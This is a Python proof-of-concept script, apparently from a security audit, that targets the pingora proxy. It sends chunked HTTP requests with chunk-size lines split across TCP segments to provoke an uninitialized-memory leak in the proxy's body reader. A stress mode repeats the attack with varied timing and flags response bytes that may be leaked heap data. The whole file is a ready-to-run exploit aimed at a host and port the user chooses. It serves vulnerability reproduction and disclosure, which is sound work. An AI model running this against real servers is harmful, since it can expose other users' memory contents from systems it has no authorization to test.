#!/usr/bin/env python3
"""
Finding 1 PoC: Uninitialized memory exposure via split chunked encoding.

Sends a chunked HTTP request where the chunk-size line is deliberately
split across TCP segments, forcing partial reads in pingora's BodyReader.
This can cause `copy_within` to leave gaps of uninitialized memory in the
body buffer that get returned as part of the response.

Usage:
    python3 repro_chunked_split.py --target 127.0.0.1 --port 6188

Requirements:
    - A running pingora proxy instance on the target host/port
    - Python 3.6+
"""

import argparse
import socket
import time
import sys


def send_split_chunked_request(host: str, port: int, delay: float = 0.1) -> bytes:
    """
    Send a chunked request with the chunk-size header split across TCP segments.
    
    The chunk-size line "a\\r\\n" (10 bytes) is split so that "a\\r" arrives
    in one TCP segment and "\\n" + data arrives in the next. This forces
    pingora's BodyReader into the partial_chunk_head path where copy_within
    is used, potentially leaking uninitialized buffer bytes.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    sock.settimeout(5.0)
    
    try:
        sock.connect((host, port))
        
        # Send the HTTP request headers
        headers = (
            b"POST / HTTP/1.1\r\n"
            b"Host: " + host.encode() + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Content-Type: application/octet-stream\r\n"
            b"\r\n"
        )
        sock.sendall(headers)
        time.sleep(delay)
        
        # --- First chunk: send normally ---
        sock.sendall(b"5\r\nHello\r\n")
        time.sleep(delay)
        
        # --- Second chunk: SPLIT the chunk-size across TCP segments ---
        # Send chunk-size "a\r" (partial chunk-size line — missing the \n)
        sock.sendall(b"a\r")
        time.sleep(delay)
        
        # Now send the rest: "\n" + 10 bytes of data + "\r\n"
        # The BodyReader sees the partial "a\r" first, stores it, then
        # on the next read gets "\n" and uses copy_within to reconstruct
        # the full chunk-size line. The gap between source and destination
        # of copy_within may contain uninitialized memory.
        sock.sendall(b"\n" + b"B" * 10 + b"\r\n")
        time.sleep(delay)
        
        # --- Third chunk: another split, smaller delay ---
        sock.sendall(b"1")
        time.sleep(delay * 2)  # Longer delay to increase chance of partial read
        sock.sendall(b"0\r")
        time.sleep(delay)
        sock.sendall(b"\n" + b"C" * 16 + b"\r\n")
        time.sleep(delay)
        
        # --- Terminating chunk ---
        sock.sendall(b"0\r\n\r\n")
        
        # Read the response
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        
        return response
        
    finally:
        sock.close()


def analyze_response(response: bytes) -> None:
    """Check the response body for signs of uninitialized memory."""
    print(f"Response length: {len(response)} bytes")
    print(f"Response (hex dump of first 512 bytes):")
    
    # Split headers from body
    header_end = response.find(b"\r\n\r\n")
    if header_end == -1:
        print("  Could not find header/body boundary")
        print(f"  Raw: {response[:200]}")
        return
    
    headers = response[:header_end].decode("utf-8", errors="replace")
    body = response[header_end + 4:]
    
    print(f"  Headers:\n    {headers}")
    print(f"  Body length: {len(body)} bytes")
    
    # Look for bytes that shouldn't be there
    expected = b"Hello" + b"B" * 10 + b"C" * 16
    
    if body == expected:
        print("\n  [OK] Body matches expected content exactly")
    else:
        print(f"\n  [!!] Body does NOT match expected content!")
        print(f"  Expected ({len(expected)} bytes): {expected.hex()}")
        print(f"  Got      ({len(body)} bytes): {body.hex()}")
        
        # Check for null bytes or other suspicious patterns
        null_count = body.count(b"\x00")
        if null_count > 0:
            print(f"  [!!] Found {null_count} null bytes — possible uninitialized memory!")
        
        # Check for bytes outside the expected set
        expected_bytes = set(b"HelloBC")
        unexpected = set(body) - expected_bytes
        if unexpected:
            print(f"  [!!] Unexpected byte values: {[hex(b) for b in sorted(unexpected)]}")
            print(f"       These may be leaked heap data!")


def stress_test(host: str, port: int, iterations: int = 50) -> None:
    """
    Run many iterations to increase the chance of observing leaked memory.
    
    The bug is timing-dependent, so we vary delays and observe results.
    """
    print(f"\n{'='*60}")
    print(f"Running {iterations} iterations with varied timing...")
    print(f"{'='*60}")
    
    anomalies = 0
    for i in range(iterations):
        delay = 0.01 + (i % 10) * 0.02  # Vary delay from 10ms to 200ms
        try:
            response = send_split_chunked_request(host, port, delay=delay)
            
            header_end = response.find(b"\r\n\r\n")
            if header_end == -1:
                continue
            body = response[header_end + 4:]
            
            expected = b"Hello" + b"B" * 10 + b"C" * 16
            if body != expected:
                anomalies += 1
                print(f"  [Iteration {i+1}] ANOMALY (delay={delay:.3f}s):")
                print(f"    Body ({len(body)} bytes): {body[:64].hex()}...")
        except (ConnectionError, socket.timeout) as e:
            print(f"  [Iteration {i+1}] Connection error: {e}")
    
    print(f"\nResults: {anomalies}/{iterations} anomalous responses")
    if anomalies > 0:
        print("[!!] Memory leak likely detected!")
    else:
        print("[OK] No anomalies detected (may need more iterations or different timing)")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for pingora uninitialized memory leak via split chunked encoding"
    )
    parser.add_argument("--target", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=6188, help="Target port")
    parser.add_argument("--stress", action="store_true", help="Run stress test with many iterations")
    parser.add_argument("--iterations", type=int, default=50, help="Number of stress test iterations")
    args = parser.parse_args()
    
    print(f"Finding 1 PoC: Uninitialized Memory in Body Buffer")
    print(f"Target: {args.target}:{args.port}")
    print(f"{'='*60}")
    
    # Single request with analysis
    print("\n[*] Sending split-chunked request...")
    try:
        response = send_split_chunked_request(args.target, args.port)
        analyze_response(response)
    except ConnectionRefusedError:
        print(f"[!] Connection refused — is pingora running on {args.target}:{args.port}?")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)
    
    # Stress test if requested
    if args.stress:
        stress_test(args.target, args.port, args.iterations)


if __name__ == "__main__":
    main()
